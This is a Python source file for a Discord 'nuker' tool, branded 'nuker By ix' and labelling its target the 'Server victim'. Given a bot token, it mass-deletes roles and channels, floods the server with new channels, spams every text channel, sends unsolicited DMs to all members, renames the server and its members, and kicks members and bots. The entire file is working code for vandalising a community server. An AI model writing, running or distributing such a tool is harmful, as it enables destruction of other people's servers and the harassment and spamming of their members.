import asyncio
import os
import sys
import time
import discord
from discord.ext import commands

RESET = "\033[0m"

RED_START = (100, 0, 0)
RED_END   = (255, 40, 40)

GREEN_START = (0, 100, 0)
GREEN_END   = (40, 255, 40)

GRAY_START = (110, 115, 125)
GRAY_END   = (230, 235, 245)

current_guild = None
selected_guild_name = "No Server Selected"
current_bot_token = ""
client = None

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def red_gradient(text):
    lines = text.splitlines()
    if not lines:
        return ""
    output = []
    for line in lines:
        colored = ""
        line_len = len(line)
        for i, char in enumerate(line):
            if char == " ":
                colored += char
                continue
            t = i / max(line_len - 1, 1)
            r = int(RED_START[0] + (RED_END[0] - RED_START[0]) * t)
            g = int(RED_START[1] + (RED_END[1] - RED_START[1]) * t)
            b = int(RED_START[2] + (RED_END[2] - RED_START[2]) * t)
            colored += f"\033[38;2;{r};{g};{b}m{char}"
        output.append(colored + RESET)
    return "\n".join(output)

def green_gradient(text):
    lines = text.splitlines()
    if not lines:
        return ""
    output = []
    for line in lines:
        colored = ""
        line_len = len(line)
        for i, char in enumerate(line):
            if char == " ":
                colored += char
                continue
            t = i / max(line_len - 1, 1)
            r = int(GREEN_START[0] + (GREEN_END[0] - GREEN_START[0]) * t)
            g = int(GREEN_START[1] + (GREEN_END[1] - GREEN_START[1]) * t)
            b = int(GREEN_START[2] + (GREEN_END[2] - GREEN_START[2]) * t)
            colored += f"\033[38;2;{r};{g};{b}m{char}"
        output.append(colored + RESET)
    return "\n".join(output)

def gray_gradient(text):
    lines = text.splitlines()
    if not lines:
        return ""
    output = []
    for line in lines:
        colored = ""
        line_len = len(line)
        for i, char in enumerate(line):
            if char == " ":
                colored += char
                continue
            t = i / max(line_len - 1, 1)
            r = int(GRAY_START[0] + (GRAY_END[0] - GRAY_START[0]) * t)
            g = int(GRAY_START[1] + (GRAY_END[1] - GRAY_START[1]) * t)
            b = int(GRAY_START[2] + (GRAY_END[2] - GRAY_START[2]) * t)
            colored += f"\033[38;2;{r};{g};{b}m{char}"
        output.append(colored + RESET)
    return "\n".join(output)

def print_red_left(text):
    print(red_gradient(text))

def print_green_left(text):
    print(green_gradient(text))

def print_timestamp(action):
    t = time.strftime('%H:%M:%S')
    msg = f"[{t}] -> {action}"
    print_green_left(msg)

def draw_menu():
    clear_screen()
    design = """
███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
  ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░░   ░ ▒░░░▒░   ░ ░ ░▒ ▒░ ░ ░  ░  ░▒   ▒░
  ░    ░ ░  ░░░   ░ ░ ░░ ░    ░     ░░   ░ 
       ░    ░     ░  ░      ░  ░  ░      
                                         
"""
    print_red_left(design)
    print_red_left("")
    print_red_left(f"      (nuker By ix) -> [ Server victim: {selected_guild_name} ]")
    print_red_left("                                                         ")
    print_red_left(" [☑ 1] All                     [☑ 2] Delete All Roles")
    print_red_left(" [☑ 3] Delete All Channels     [☑ 4] Create Channels")
    print_red_left(" [☑ 5] Bot Spam                [☑ 6] Change Server Name")
    print_red_left(" [☑ 7] Kick All Members        [☑ 8] Kick All Bots ")
    print_red_left(" [☑ 9] Rename All Members      [☑ S] Select Server ID")
    print_red_left(" [☑ 0] Exit")
    print_red_left("                                                         ")

async def initialize_bot():
    global client
    clear_screen()
    print_red_left("Welcome to Darkness GROUP")
    while True:
        token = input(gray_gradient("Enter Bot Token: ")).strip()
        if token:
            global current_bot_token
            current_bot_token = token
            print_timestamp("Authenticating bot token...")
            intents = discord.Intents.default()
            intents.guilds = True
            intents.members = True
            intents.messages = True
            intents.guild_messages = True
            client = commands.Bot(command_prefix="!", intents=intents)
            try:
                asyncio.create_task(client.start(token))
                for _ in range(20):
                    if client.is_ready():
                        break
                    await asyncio.sleep(0.5)
                if client.user:
                    print_timestamp("Bot connected successfully.")
                    await asyncio.sleep(1)
                    break
                else:
                    print_red_left("[Error] Authentication failed. Check token.")
            except Exception as e:
                print_red_left(f"[Error] Authentication failed: {e}")
        else:
            print_red_left("[Error] Token cannot be empty!")
    await select_guild()
    await main_dashboard()

async def select_guild():
    global current_guild, selected_guild_name, client
    if client is None:
        print_red_left("[Error] Bot is not logged in yet!")
        time.sleep(2)
        return
    clear_screen()
    print_red_left("Select Target Guild:")
    while not client.guilds:
        await asyncio.sleep(0.5)
    guilds = client.guilds
    if not guilds:
        print_red_left("[!] The bot is not in any servers yet!")
        time.sleep(2)
        return
    for i, g in enumerate(guilds):
        print_red_left(f" [{i+1}] {g.name} (ID: {g.id})")
    while True:
        try:
            choice_str = input(gray_gradient("Enter guild number or ID: ")).strip()
            if not choice_str:
                continue
            if choice_str.isdigit() and len(choice_str) < 3:
                choice = int(choice_str) - 1
                if 0 <= choice < len(guilds):
                    current_guild = guilds[choice]
                    selected_guild_name = current_guild.name
                    return current_guild
            for g in guilds:
                if str(g.id) == choice_str:
                    current_guild = g
                    selected_guild_name = g.name
                    return current_guild
            print_red_left("[Error] Invalid guild number or ID. Try again.")
        except ValueError:
            print_red_left("[Error] Please enter a valid number or ID.")

async def action_delete_roles(guild):
    print_timestamp("Starting: ULTRA-TURBO deleting all roles...")
    tasks = [role.delete() for role in guild.roles if role != guild.default_role and role < guild.me.top_role]
    await asyncio.gather(*tasks, return_exceptions=True)
    print_timestamp("Finished: All roles deleted instantly.")

async def action_delete_channels(guild):
    print_timestamp("Starting: ULTRA-TURBO deleting all channels...")
    tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    print_timestamp("Finished: All channels deleted instantly.")

async def action_create_channels(guild, c_name, c_count):
    print_timestamp(f"Starting: ULTRA-TURBO creating {c_count} channels ({c_name})...")
    batch_size = 40
    for i in range(0, c_count, batch_size):
        tasks = [guild.create_text_channel(c_name) for _ in range(min(batch_size, c_count - i))]
        await asyncio.gather(*tasks, return_exceptions=True)
    print_timestamp("Finished: Channel creation complete at max speed.")

async def action_bot_spam_all_created(guild, spam_msg):
    print_timestamp("Starting: MAXIMUM-SPEED spamming all text channels...")
    text_channels = guild.text_channels
    if not text_channels:
        print_timestamp("[!] No text channels found to spam.")
        return
    
    tasks = []
    for channel in text_channels:
        for _ in range(5):
            tasks.append(channel.send(spam_msg))
            
    batch_size = 100
    for i in range(0, len(tasks), batch_size):
        await asyncio.gather(*tasks[i:i+batch_size], return_exceptions=True)
        
    print_timestamp("Finished: Maximum speed spam completed instantly.")

async def action_send_dm(guild, dm_msg, client_user):
    print_timestamp("Starting: Turbo sending DMs to members...")
    async for member in guild.fetch_members(limit=None):
        if member != client_user and not member.bot:
            try:
                asyncio.create_task(member.send(dm_msg))
            except:
                pass
    print_timestamp("Finished: Direct Messages dispatched.")

async def action_change_server_name(guild, new_name):
    print_timestamp(f"Starting: Changing server name to {new_name}...")
    try:
        await guild.edit(name=new_name)
        print_timestamp("Server name changed successfully.")
    except:
        pass

async def action_kick_members(guild, client_user, limit_count):
    print_timestamp(f"Starting: Turbo kicking up to {limit_count} members/bots...")
    kicked = 0
    async for member in guild.fetch_members(limit=None):
        if kicked >= limit_count:
            break
        if member != client_user and member != guild.owner:
            try:
                asyncio.create_task(member.kick(reason="Lab Turbo Kick"))
                kicked += 1
            except:
                pass
    print_timestamp("Finished: Kick sequence complete.")

async def main_dashboard():
    global current_guild, client
    while True:
        draw_menu()
        while True:
            choice = input(gray_gradient("wakeup@user: ")).strip().lower()
            if not choice:
                continue
            if choice in ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 's']:
                break
            print_red_left("[Error] Invalid option! Please choose a valid option from the menu.")
            time.sleep(1.5)
        
        if choice == '0':
            print_red_left("Exiting tool...")
            if client:
                await client.close()
            break

        if choice == 's':
            await select_guild()
            continue

        if current_guild is None:
            print_red_left("[!] No server selected yet. Please select a server first.")
            time.sleep(1)
            await select_guild()
            if current_guild is None:
                continue

        guild = current_guild
        client_user = client.user if client else None
        
        if choice == '1': 
            clear_screen()
            print_red_left("INTERACTIVE SETUP WIZARD MAXIMUM TURBO")
            
            while True:
                del_roles_choice = input(gray_gradient("1. Do you want to delete all roles? (y/n): ")).strip().lower()
                if del_roles_choice in ['y', 'n']:
                    break
                print_red_left("[Error] Please enter 'y' or 'n'.")
                
            while True:
                del_channels_choice = input(gray_gradient("2. Do you want to delete existing channels? (y/n): ")).strip().lower()
                if del_channels_choice in ['y', 'n']:
                    break
                print_red_left("[Error] Please enter 'y' or 'n'.")
                
            while True:
                c_name = input(gray_gradient("3. Enter mass channel name to create: ")).strip()
                if c_name:
                    break
                print_red_left("[Error] Channel name cannot be empty.")
                
            while True:
                try:
                    c_count = int(input(gray_gradient("4. Enter channel count: ")).strip())
                    if c_count > 0:
                        break
                    print_red_left("[Error] Count must be greater than 0.")
                except ValueError:
                    print_red_left("[Error] Please enter a valid integer.")
                
            while True:
                spam_msg = input(gray_gradient("5. Enter spam message (will be sent instantly in all channels): ")).strip()
                if spam_msg:
                    break
                print_red_left("[Error] Spam message cannot be empty.")
                
            while True:
                new_sname = input(gray_gradient("6. Enter new server name: ")).strip()
                if new_sname:
                    break
                print_red_left("[Error] Server name cannot be empty.")
                
            while True:
                dm_msg = input(gray_gradient("7. Enter Private DM message to send to members: ")).strip()
                if dm_msg:
                    break
                print_red_left("[Error] DM message cannot be empty.")
                
            while True:
                try:
                    kick_limit = int(input(gray_gradient("8. Enter number of members/bots to kick: ")).strip())
                    if kick_limit >= 0:
                        break
                    print_red_left("[Error] Limit cannot be negative.")
                except ValueError:
                    print_red_left("[Error] Please enter a valid integer.")
            
            print_red_left("\n=== LAUNCHING MAXIMUM SPEED SEQUENCE... ===")
            await asyncio.sleep(0.5)
            clear_screen()
            
            if del_roles_choice == 'y':
                await action_delete_roles(guild)
                
            if del_channels_choice == 'y':
                await action_delete_channels(guild)
            
            await action_create_channels(guild, c_name, c_count)
            
            tasks_to_run = [
                action_bot_spam_all_created(guild, spam_msg),
                action_change_server_name(guild, new_sname),
                action_send_dm(guild, dm_msg, client_user),
                action_kick_members(guild, client_user, kick_limit)
            ]
            
            await asyncio.gather(*tasks_to_run, return_exceptions=True)
            
            print_timestamp("=== ALL TASKS COMPLETED INSTANTLY. Resetting view... ===")
            await asyncio.sleep(2)

        elif choice == '2':
            clear_screen()
            await action_delete_roles(guild)
            print_timestamp("Resetting view...")
            await asyncio.sleep(1)

        elif choice == '3':
            clear_screen()
            await action_delete_channels(guild)
            print_timestamp("Resetting view...")
            await asyncio.sleep(1)

        elif choice == '4':
            while True:
                c_name = input(gray_gradient("Enter channel name: ")).strip()
                if c_name:
                    break
                print_red_left("[Error] Channel name cannot be empty.")
            while True:
                try:
                    c_count = int(input(gray_gradient("Enter channel count: ")).strip())
                    if c_count > 0:
                        break
                    print_red_left("[Error] Count must be greater than 0.")
                except ValueError:
                    print_red_left("[Error] Please enter a valid number.")
            clear_screen()
            await action_create_channels(guild, c_name, c_count)
            print_timestamp("Resetting view...")
            await asyncio.sleep(1)

        elif choice == '5':
            while True:
                spam_msg = input(gray_gradient("Enter spam message: ")).strip()
                if spam_msg:
                    break
                print_red_left("[Error] Message cannot be empty.")
            clear_screen()
            await action_bot_spam_all_created(guild, spam_msg)
            print_timestamp("Resetting view...")
            await asyncio.sleep(1)

        elif choice == '6':
            while True:
                new_name = input(gray_gradient("Enter new server name: ")).strip()
                if new_name:
                    break
                print_red_left("[Error] Server name cannot be empty.")
            clear_screen()
            await action_change_server_name(guild, new_name)
            print_timestamp("Resetting view...")
            await asyncio.sleep(1)

        elif choice == '7':
            clear_screen()
            while True:
                try:
                    limit = int(input(gray_gradient("Enter number of members to kick: ")).strip())
                    if limit >= 0:
                        break
                    print_red_left("[Error] Limit cannot be negative.")
                except ValueError:
                    print_red_left("[Error] Please enter a valid number.")
            await action_kick_members(guild, client_user, limit)
            print_timestamp("Resetting view...")
            await asyncio.sleep(1)

        elif choice == '8':
            clear_screen()
            for member in guild.members:
                if member.bot and member.top_role < guild.me.top_role:
                    try:
                        asyncio.create_task(member.kick(reason="Lab Bot Clean"))
                    except:
                        pass
            print_timestamp("Finished: Bots kicked. Resetting view...")
            await asyncio.sleep(1)

        elif choice == '9':
            while True:
                new_nick = input(gray_gradient("Enter new nickname for members: ")).strip()
                if new_nick:
                    break
                print_red_left("[Error] Nickname cannot be empty.")
            clear_screen()
            async for member in guild.fetch_members(limit=None):
                if member != guild.owner:
                    try:
                        asyncio.create_task(member.edit(nick=new_nick))
                    except:
                        pass
            print_timestamp("Finished: Members renamed. Resetting view...")
            await asyncio.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(initialize_bot())
    except KeyboardInterrupt:
        print_red_left("\nTool terminated safely by user.")
        sys.exit(0)